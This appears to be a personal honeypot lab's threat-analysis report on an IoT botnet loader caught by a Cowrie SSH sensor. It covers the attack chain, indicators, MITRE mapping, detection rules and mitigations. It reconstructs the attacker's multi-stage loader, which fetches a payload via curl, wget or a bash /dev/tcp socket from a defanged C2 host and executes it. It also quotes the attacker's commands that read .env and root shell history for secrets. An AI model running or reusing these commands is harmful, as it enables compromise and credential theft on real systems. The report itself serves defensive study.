# Threat Analysis #4 — Linux/IoT Botnet Loader with Multi-Stage Delivery and a Honeypot Telemetry Gap

**Author:** Hubert (MiecznikH)
**Sensor:** Cowrie SSH honeypot (AWS, `us-west-1`), logs shipped to Wazuh SIEM
**Classification:** Linux/IoT DDoS botnet loader — assessed as Mirai/Gafgyt family (medium confidence, behavioral)
**Status:** Payload delivery observed; binary not captured (see Key Finding)

---

## Executive summary

The honeypot recorded a fully automated compromise attempt in which an attacker authenticated over SSH, verified shell execution, hunted for local secrets, and attempted to deliver a ~3.8 MB UPX-packed Linux binary from a hardcoded command-and-control (C2) host.

The loader is notable for two things. First, its **three-stage download fallback**: it tries `curl`, then `wget`, then a raw Bash `/dev/tcp` TCP socket — ensuring delivery even on a minimal system stripped of common networking tools. Second, and more useful defensively, that third fallback **evades Cowrie's file-capture telemetry entirely**: the honeypot hooks `wget`/`curl`/`tftp` but not raw socket transfers, so the payload was requested but never written to Cowrie's `downloads/` store. This is a concrete, transferable lesson about the blind spots of interaction-based honeypots — and the basis for the detection guidance at the end of this report.

Behavioral indicators (architecture-specific binary fetch, config passed as an argument, `echo -e "\x6F\x6B"` execution probe, DDoS-oriented Linux/IoT targeting) align with the **Mirai/Gafgyt** lineage. Attribution is behavioral only; the binary itself was not recovered, so this is an assessment, not a confirmed sample.

---

## Detection and context

The activity surfaced during routine review of `cowrie.command.input` events. Two data points frame it:

- **Login telemetry:** 3,876 successful SSH logins against a single failure. This lopsided ratio reflects the honeypot's permissive `userdb` (Cowrie accepts nearly any credential by design), not the attacker's skill — worth stating plainly so the reader doesn't over-read it. What matters is what the attacker *did* after landing.
- **Command telemetry:** 3,862 identical `echo -e "\x6F\x6B"` events dominated the command feed, followed by a small cluster of high-value commands — secret access and the loader itself.

---

## Attack chain

The session decomposes cleanly into a five-stage kill chain.

**1. Access.** Automated SSH authentication against the exposed service. On a honeypot this always "succeeds"; on a real target this stage would represent credential brute-forcing or reuse.

**2. Shell verification.** The attacker issued `echo -e "\x6F\x6B"` thousands of times. The hex `\x6F\x6B` decodes to the ASCII string `ok` — the bot confirms that the shell executes commands and returns their output before committing its payload. This "canary" behavior is characteristic of Mirai-derived loaders that spray many hosts and only escalate on confirmed-live shells.

**3. Credential and secret discovery.** Two targeted reads:
- `cat /opt/app/.env` — application environment files routinely hold database URLs, API keys, and cloud credentials.
- `cat /root/.bash_history` — command history frequently leaks credentials typed inline and reveals what the box is used for.

**4. Payload delivery (the loader).** A single `nohup` one-liner attempted to fetch and run the second-stage binary. Reconstructed logic:

```bash
# Stage 1: preferred fetch
curl http://43.100.32[.]28:60133/linux -o /tmp/ZFV0om8TCk

# Stage 2: fallback if curl absent/failed
if [ ! -f /tmp/ZFV0om8TCk ]; then
    wget http://43.100.32[.]28:60133/linux -O /tmp/ZFV0om8TCk
fi

# Stage 3: fallback via raw Bash TCP socket (no wget/curl needed)
if [ ! -f /tmp/ZFV0om8TCk ]; then
    exec 6<>/dev/tcp/43.100.32[.]28/60133 \
      && echo -n 'GET /linux' >&6 \
      && cat 0<&6 > /tmp/ZFV0om8TCk
fi

# Execute with an embedded base64 configuration/key argument
chmod +x /tmp/ZFV0om8TCk && /tmp/ZFV0om8TCk <BASE64_CONFIG>

# Drop a hardcoded credential to disk
echo Aa@123456 > /tmp/.opass
```

Three details worth calling out:

- The **URL path `/linux`** implies the C2 serves architecture-specific builds (a hallmark of Mirai/Gafgyt, which cross-compile for MIPS, ARM, x86, etc., and select by path or user-agent).
- The **base64 blob passed as an argument** is the bot's runtime configuration or key material, handed off out of band rather than embedded — a pattern that complicates static analysis of the binary alone.
- `Aa@123456` written to `/tmp/.opass` is a hardcoded operator credential, reused across many samples in this family and therefore a useful hunting indicator.

**5. Binary staging.** Subsequent events (`head -c 3815748 > /tmp/tpc3RaX7Pd`, and reads against `/bin/echo` returning the `UPX!` signature) indicate the delivered artifact was a **~3,815,748-byte UPX-packed executable**. UPX packing is standard evasion for this family — it shrinks the binary for constrained IoT devices and defeats naïve signature matching.

---

## Key finding: the `/dev/tcp` fallback defeats Cowrie's file capture

Cowrie recovers dropped files by emulating specific commands — `wget`, `curl`, `tftp` — and writing whatever they "download" into its `downloads/` directory, keyed by SHA-256. Its `download_limit_size` (default 10 MB) was well above the ~3.8 MB payload, so size was not the constraint.

The payload nonetheless never landed in `downloads/`. The reason is architectural: **the third fallback delivers the file through `exec 6<>/dev/tcp/host/port`, a Bash-native file descriptor, not through any command Cowrie hooks.** The transfer happens one layer below the honeypot's capture logic. The attempt is fully visible in `command.input` telemetry — but the artifact is not, because the honeypot was never designed to see raw-socket transfers.

The practical takeaway for a SOC: **behavioral telemetry and artifact capture are different data sources with different blind spots.** A detection strategy that leans only on captured samples would miss this delivery method entirely; one that inspects command content catches it. That gap is exactly what the detection rules below target.

---

## MITRE ATT&CK mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Initial Access | T1078 Valid Accounts | SSH authentication to the exposed service |
| Execution | T1059.004 Command and Scripting Interpreter: Unix Shell | `nohup`/`sh` loader one-liner |
| Discovery / Credential Access | T1552.001 Unsecured Credentials: Credentials In Files | `cat /opt/app/.env`, `cat /root/.bash_history` |
| Command and Control | T1105 Ingress Tool Transfer | curl / wget / `/dev/tcp` fetch of second stage |
| Defense Evasion | T1027.002 Obfuscated Files or Information: Software Packing | UPX-packed binary (`UPX!` signature) |
| Defense Evasion | T1140 Deobfuscate/Decode Files or Information | base64 config argument |
| Impact (assessed) | T1498 / T1499 Network / Endpoint Denial of Service | Consistent with Mirai/Gafgyt DDoS tasking |

Impact is assessed from family behavior, not observed on this sensor.

---

## Indicators of Compromise

IOCs are defanged. Treat all as hostile.

| Type | Value |
|---|---|
| C2 IP | `43.100.32[.]28` |
| C2 port | `60133` |
| C2 URL | `hxxp://43.100.32[.]28:60133/linux` |
| Dropped file (payload) | `/tmp/ZFV0om8TCk` |
| Dropped file (staging) | `/tmp/tpc3RaX7Pd` |
| Dropped file (credential) | `/tmp/.opass` |
| Hardcoded credential | `Aa@123456` |
| Payload size | ~3,815,748 bytes, UPX-packed |
| Behavioral signature | repeated `echo -e "\x6F\x6B"` execution probe |
| Behavioral signature | `exec <n><>/dev/tcp/<host>/<port>` raw-socket download |

Filenames under `/tmp/` are randomized per campaign and are weak indicators in isolation; the C2 endpoint, hardcoded credential, and behavioral signatures are the durable ones.

---

## Attribution assessment

**Assessment: Mirai/Gafgyt-family Linux/IoT DDoS loader. Confidence: medium, behavioral.**

Supporting indicators: architecture-specific payload path (`/linux`), multi-method download with fallback, configuration/key passed as a runtime argument, hardcoded operator credential reused across the family, UPX packing, and the `\x6F\x6B` shell-verification probe documented in Mirai variants.

Confidence is capped at medium because the binary was not recovered (see Key Finding), so no static confirmation, hash, or vendor classification is available. This is an assessment from tactics, techniques, and procedures — not a confirmed sample. Recovering a live sample on a future run (see recommendations) would allow this to be upgraded or corrected.

---

## Detection and mitigation

**Detection (Sigma / Wazuh).** The delivery attempt is fully catchable in command telemetry. Two complementary rules, published in this repository under `detections/`:

1. Tool-transfer commands in a Cowrie session — `input` containing `wget `, `curl `, or `tftp `.
2. The higher-signal, harder-to-evade indicator — `input` containing `/dev/tcp/`, which almost never appears in legitimate administrative sessions and would have caught this loader's third fallback where the tool-based rule would not.

Both map to T1105. Rule 2 is the more valuable one precisely because it targets the evasion path the honeypot itself could not capture.

**Sample recovery (future work).** To capture the binary next time despite the `/dev/tcp` path, add a real-time Wazuh alert on `/dev/tcp/` in `command.input` and pair it with an out-of-band network capture (`tcpdump -i any host <C2>`) triggered on that alert — recovering the payload from the wire rather than relying on Cowrie's emulated download.

**Mitigation (real-world framing).** Against production systems this chain is defeated by fundamentals: key-based SSH with passwords disabled; secrets kept out of `.env`/history and injected at runtime; egress filtering that blocks unexpected outbound connections (which would break all three download stages); and file-integrity/EDR monitoring on `/tmp` execution.

---

## Limitations

Stated plainly, because honest scoping is part of the analysis:

- The binary was not recovered; attribution is behavioral, not confirmed.
- Login-success counts are inflated by the honeypot's permissive credential handling and say nothing about attacker capability.
- Impact (DDoS) is inferred from family behavior, not observed on this sensor.

---

*Captured and analyzed on a personal Cowrie/Wazuh honeypot lab. Environment is rebuilt as Terraform (infrastructure-as-code); see the lab repository for the deployment and the post-restart operational post-mortem.*
